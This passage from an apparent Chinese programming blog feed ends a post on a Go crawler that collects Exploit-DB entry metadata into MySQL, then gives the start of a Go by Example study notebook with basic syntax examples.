class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;11999&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Redway Security&quot;</span>&#125;,<span class="hljs-string">&quot;download&quot;</span>:<span class="hljs-string">&quot;&lt;a href=<span class="hljs-subst">\&quot;</span>\/download\/51747<span class="hljs-subst">\&quot;</span> aria-label=<span class="hljs-subst">\&quot;</span>Download51747<span class="hljs-subst">\&quot;</span>&gt;&lt;i class=<span class="hljs-subst">\&quot;</span>mdi mdi-download mdi-18px<span class="hljs-subst">\&quot;</span> style=<span class="hljs-subst">\&quot;</span>color: #132f50<span class="hljs-subst">\&quot;</span>&gt;&lt;\/i&gt;&lt;\/a&gt;&quot;</span>&#125;],<span class="hljs-string">&quot;0&quot;</span>:<span class="hljs-string">&quot;tags&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>:<span class="hljs-string">&quot;author:id,name&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>:<span class="hljs-string">&quot;type&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>:<span class="hljs-string">&quot;platform&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>要提取的漏洞信息即为json数据中data部分，将data中每条数据分别筛选处理即可。</p><p>在获取网站的response后，先转换成json格式，再存储到map[string]interface{}结构中，后续使用时先进行断言，再插入数据库的对应字段。</p><p>核心代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> data <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">if</span> err := json.Unmarshal(body, &amp;data); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error parsing into json:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> data[<span class="hljs-string">&quot;data&quot;</span>].([]<span class="hljs-keyword">interface</span>&#123;&#125;) &#123;<br>itemData := item.(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br>extractedData := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<br><span class="hljs-string">&quot;id&quot;</span>:             itemData[<span class="hljs-string">&quot;id&quot;</span>],<br><span class="hljs-string">&quot;description&quot;</span>:    itemData[<span class="hljs-string">&quot;description&quot;</span>],<br><span class="hljs-string">&quot;type_id&quot;</span>:        itemData[<span class="hljs-string">&quot;type_id&quot;</span>],<br><span class="hljs-string">&quot;platform_id&quot;</span>:    itemData[<span class="hljs-string">&quot;platform_id&quot;</span>],<br><span class="hljs-string">&quot;date_published&quot;</span>: itemData[<span class="hljs-string">&quot;date_published&quot;</span>],<br><span class="hljs-string">&quot;verified&quot;</span>:       itemData[<span class="hljs-string">&quot;verified&quot;</span>],<br><span class="hljs-string">&quot;code&quot;</span>:           itemData[<span class="hljs-string">&quot;code&quot;</span>],<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了提高爬取速度，设置了20协程，并且通过一个chan struct{}来统计成功插入数据库的条数。</p><p>核心代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> semaphore = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sendRequest</span><span class="hljs-params">(start <span class="hljs-type">int</span>, length <span class="hljs-type">int</span>, wg *sync.WaitGroup, successChan <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//释放信号量，允许其他协程执行</span><br>&lt;-semaphore<br>&#125;()<br><span class="hljs-comment">//获取信号量，控制并发数</span><br>semaphore &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>......<br>successChan &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Crawl</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>successChan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br><br><span class="hljs-keyword">for</span> ... &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> sendRequest(start, itemsPerPage, &amp;wg, successChan)<br>&#125;<br><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(successChan)<br>&#125;()<br><br>successCount := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> successChan &#123;<br>successCount++<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>数据库选择mysql，表结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">_, err := db.Exec(<span class="hljs-string">`</span><br><span class="hljs-string">CREATE TABLE IF NOT EXISTS exploit_db (</span><br><span class="hljs-string">    id INT,</span><br><span class="hljs-string">description VARCHAR(255),</span><br><span class="hljs-string">type VARCHAR(50),</span><br><span class="hljs-string">platform VARCHAR(50),</span><br><span class="hljs-string">date_published DATE,</span><br><span class="hljs-string">verified INT,</span><br><span class="hljs-string">cve VARCHAR(2048),</span><br><span class="hljs-string">osvdb VARCHAR(2048),</span><br><span class="hljs-string">otherNum VARCHAR(2048)</span><br><span class="hljs-string">);</span><br><span class="hljs-string">`</span>)<br></code></pre></td></tr></table></figure><p>创建一个init()函数，用于在初始化时创建一个连接池，防止在并发爬取数据，插入数据库时，因为连接数过多而产生错误：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> db *sql.DB<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>initDB()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initDB</span><span class="hljs-params">()</span></span> &#123;<br>connectionString := fmt.Sprintf(<span class="hljs-string">&quot;%s:%s@tcp(127.0.0.1:3306)/%s&quot;</span>, username, password, databaseConnection)<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>db, err = sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, connectionString)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error connecting mysql database:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>db.SetMaxIdleConns(<span class="hljs-number">20</span>)<br>db.SetMaxOpenConns(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error connecting mysql database:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>设置最大线程数为20，在3min之内可以成功获取所有信息：</p><p><img src="/2023/04/27/file-upload/age-20231207164211568.png" alt="image-20231207164211568"></p><p>查看数据库信息：</p><p>包含id，描述，type，platform，date_published，verified，cve，osvdb，others等字段：</p><p><img src="/2023/04/27/file-upload/age-20231207164427659.png" alt="image-20231207164427659"></p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>exploit-db</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gobyexample通关笔记</title>
    <link href="/2024/07/23/gobyexample%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/07/23/gobyexample%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://gobyexample.com/">Go by Example</a></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    fmt.Println(<span class="hljs-string">&quot;Hello World&quot;</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Values"><a href="#Values" class="headerlink" title="Values"></a>Values</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func main() &#123;  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-string">&quot;go&quot;</span> + <span class="hljs-string">&quot;lang&quot;</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-string">&quot;1+1=&quot;</span>, <span class="hljs-number">1</span>+<span class="hljs-number">1</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-string">&quot;7.0/3.0&quot;</span>, <span class="hljs-number">7.0</span>/<span class="hljs-number">3.0</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">false</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><p>fmt.Println() 函数是一个可变参数函数，可以接受任意数量的参数，并在输出时将它们格式化为字符串。在执行 fmt.Println(“1+1&#x3D;”, 1+1) 时，Go 会将第一个参数 “1+1&#x3D;” 和第二个参数 1+1格式化为字符串，并将它们连在一起输出。由于1+1 是一个表达式，它会在编译时求值并将结果转换为字符串。</p><h2 id="Variables"><a href="#Variables" class="headerlink" title="Variables"></a>Variables</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;golang&quot;</span>  <br>    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span>, c = <span class="hljs-number">12</span>, <span class="hljs-number">34</span>  <br>    <span class="hljs-selector-tag">var</span> d = true  <br>    e := <span class="hljs-string">&quot;ry4n&quot;</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c, d, e)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Constants"><a href="#Constants" class="headerlink" title="Constants"></a>Constants</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;math&quot;</span>)  <br>  <br><span class="hljs-keyword">const</span> s <span class="hljs-type">string</span> = <span class="hljs-string">&quot;conststring&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    fmt.Println(s)  <br>    <span class="hljs-keyword">const</span> n = <span class="hljs-number">500</span>  <br>    fmt.Println(n)  <br>    fmt.Println(<span class="hljs-type">int64</span>(n))  <br>    fmt.Println(math.Sin(n))  <br>&#125;<br></code></pre></td></tr></table></figure><p>数值型的常量在被赋予类型之前没有类型，例如显示转换。</p><h2 id="For"><a href="#For" class="headerlink" title="For"></a>For</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    i := <span class="hljs-number">1</span>  <br>    <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">5</span> &#123;  <br>       fmt.Println(i)  <br>       i++  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">3</span>; j++ &#123;  <br>       fmt.Println(j)  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> k := <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">5</span>; k++ &#123;  <br>       <span class="hljs-keyword">if</span> k%<span class="hljs-number">2</span> == <span class="hljs-number">0</span> &#123;  <br>          <span class="hljs-keyword">continue</span>  <br>       &#125;  <br>       fmt.Println(k)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="If-Else"><a href="#If-Else" class="headerlink" title="If&#x2F;Else"></a>If&#x2F;Else</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>)  <br>  <br>func main() &#123;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">7</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;even&quot;</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">8</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;odd&quot;</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">7</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-number">8</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println<span class="hljs-built_in">(false</span>)  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> <span class="hljs-number">7</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> || <span class="hljs-number">8</span><span class="hljs-meta">%2</span> == <span class="hljs-number">0</span> &#123;  <br>       fmt.Println<span class="hljs-built_in">(true</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">var</span> input <span class="hljs-type">string</span>  <br>    fmt.Scanln(&amp;input)  <br>    <span class="hljs-keyword">switch</span> input &#123;  <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:  <br>       &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;input 1&quot;</span>)  <br>       &#125;  <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:  <br>       &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;input 2&quot;</span>)  <br>       &#125;  <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;3&quot;</span>:  <br>       &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;input 3&quot;</span>)  <br>       &#125;  <br>    <span class="hljs-keyword">default</span>:  <br>       fmt.Println(<span class="hljs-string">&quot;input others&quot;</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-attr">[5]</span>int  <br>    <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> := range <span class="hljs-selector-tag">a</span> &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span>)  <br>    &#125;  <br>    <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[1]</span> = <span class="hljs-number">3</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[1]</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(a))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a>Slice</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;reflect&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">var</span> s <span class="hljs-selector-attr">[]</span>string  <br>    fmt<span class="hljs-selector-class">.Println</span>(reflect<span class="hljs-selector-class">.TypeOf</span>(s))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(s), <span class="hljs-built_in">cap</span>(s))  <br>  <br>    s1 := <span class="hljs-built_in">make</span>(<span class="hljs-selector-attr">[]</span>string, <span class="hljs-number">5</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(reflect<span class="hljs-selector-class">.TypeOf</span>(s1))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))  <br>  <br>    s1<span class="hljs-selector-attr">[0]</span> = <span class="hljs-string">&quot;a&quot;</span>  <br>    s1 = <span class="hljs-built_in">append</span>(s1, <span class="hljs-string">&quot;b&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(s1)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>)  <br>    m[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;first&quot;</span>  <br>    m[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;second&quot;</span>  <br>    fmt.Println(m)  <br>    <span class="hljs-built_in">delete</span>(m, <span class="hljs-number">1</span>)  <br>    fmt.Println(m)  <br>    m = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>)  <br>    fmt.Println(m)  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以通过 make 创建一个新的 map，来删除原来 map 中的数据。</p><h2 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    num := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;  <br>    sum := <span class="hljs-number">0</span>  <br>    <span class="hljs-keyword">for</span> _, i := <span class="hljs-keyword">range</span> num &#123;  <br>       sum += i  <br>    &#125;  <br>    fmt.Println(sum)  <br>    m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)  <br>    m[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-string">&quot;apple&quot;</span>  <br>    m[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-string">&quot;golang&quot;</span>  <br>    <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;  <br>       fmt.Println(k, v)  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> m &#123;  <br>       fmt.Println(j)  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">plus</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;  <br>    <span class="hljs-keyword">return</span> a + b  <br>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    res := plus(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <br>    fmt.Println(res)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Multiple-Return-Values"><a href="#Multiple-Return-Values" class="headerlink" title="Multiple Return Values"></a>Multiple Return Values</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span 